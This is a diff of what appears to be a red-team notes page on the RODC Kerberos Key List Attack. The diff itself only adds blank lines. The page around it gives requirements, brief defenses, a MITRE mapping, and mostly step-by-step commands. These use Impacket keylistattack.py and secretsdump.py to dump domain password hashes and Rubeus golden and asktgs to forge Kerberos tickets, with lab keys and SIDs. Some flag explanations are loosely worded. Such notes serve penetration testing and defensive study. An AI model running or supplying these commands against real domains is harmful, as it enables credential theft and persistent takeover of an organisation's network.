@@ -44,6 +44,8 @@ From a technical perspective, the RODC Key List Attack involves requesting the K
 
 The business value of this attack is that it allows an attacker to gain access to sensitive data and systems without being detected. It highlights the importance of securing RODCs and implementing proper access controls to prevent unauthorized access.
 
+ 
+
 ## Requirements
 
 1. Access to an RODC
@@ -51,6 +53,8 @@ The business value of this attack is that it allows an attacker to gain access t
 1. Ability to request the KDC to provide the RODC's Key List
 
 1. Impacket and Rubeus tools
+
+ 
 
 ## Defense
 
@@ -60,17 +64,27 @@ The business value of this attack is that it allows an attacker to gain access t
 
 1. Implement multi-factor authentication to prevent Golden Ticket attacks
 
+ 
+
 ## Objectives
 
 1. Extract password hashes of users from an RODC
 
 1. Create a Golden Ticket for any user in the domain
 
+ 
+
 # Instructions
 
 1. Use these commands to perform a Kerberos Key List Attack using Impacket.
 
+ 
+
+
+
 **Code**: [[# keylistattack.py using SAMR user enumeration wit]]
+
+
 
 > The Kerberos Key List Attack is a method of extracting password hashes from a domain controller by requesting a list of keys that are used to encrypt the Kerberos tickets. The keylistattack.py and secretsdump.py commands are part of the Impacket toolkit and can be used to perform this attack. 
 
@@ -78,11 +92,17 @@ The keylistattack.py command can be used to perform a Kerberos Key List Attack u
 
 The secretsdump.py command can be used to perform a Kerberos Key List Attack using the -use-keylist option. The DOMAIN/user:password@host option is used to specify the domain, user, password, and host respectively. The -rodcNo and -rodcKey options are used to specify the RODC number and key respectively.
 
+
+
 **Command** ([[keylistattack.py using SAMR user enumeration without filtering (-full flag)]]):
 
 ```bash
 keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
 ```
+
+
+
+
 
 **Command** ([[keylistattack.py defining a target username (-t flag)]]):
 
@@ -90,17 +110,31 @@ keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXX
 keylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST
 ```
 
+
+
+
+
 **Command** ([[secretsdump.py using the Kerberos Key List Attack option (-use-keylist)]]):
 
 ```bash
 secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
 ```
 
+
+
 2. This command is used to create a Golden Ticket using Rubeus. The 'golden' option is used to create the ticket and the '/rodcNumber' flag specifies the RODC number. The '/aes256' flag specifies the AES256 key to encrypt the ticket. The '/user' flag specifies the user account to create the ticket for. The '/id' flag specifies the user ID. The '/domain' flag specifies the domain name. The '/sid' flag specifies the user's SID. The 'asktgs' option is used to request a TGS for a specified service. The '/enctype' flag specifies the encryption type. The '/keyList' flag requests all available keys for the specified service. The '/service' flag specifies the service name in the format 'service/hostname'. The '/dc' flag specifies the domain controller to use. The '/ticket' flag specifies the TGT ticket to use.
+
+ 
+
+
 
 **Code**: [[Rubeus.exe golden /rodcNumber:25078 /aes256:eacd89]]
 
+
+
 > This command is useful for attackers who have gained access to a domain controller and want to create a Golden Ticket to maintain persistent access to the network. A Golden Ticket is a forged Kerberos ticket that grants the attacker full access to the domain. The Rubeus tool is commonly used by attackers to create and use Golden Tickets.
+
+
 
 **Command** ([[Rubeus.exe golden]]):
 
@@ -108,11 +142,17 @@ secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXX
 Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871
 ```
 
+
+
+
+
 **Command** ([[Rubeus.exe asktgs]]):
 
 ```bash
 Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -143,3 +183,5 @@ Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab
 - [[Active Directory Attacks]]
 - [[RODC Key List Attack]]
 - [[RODC - Read Only Domain Controller]]
+
+
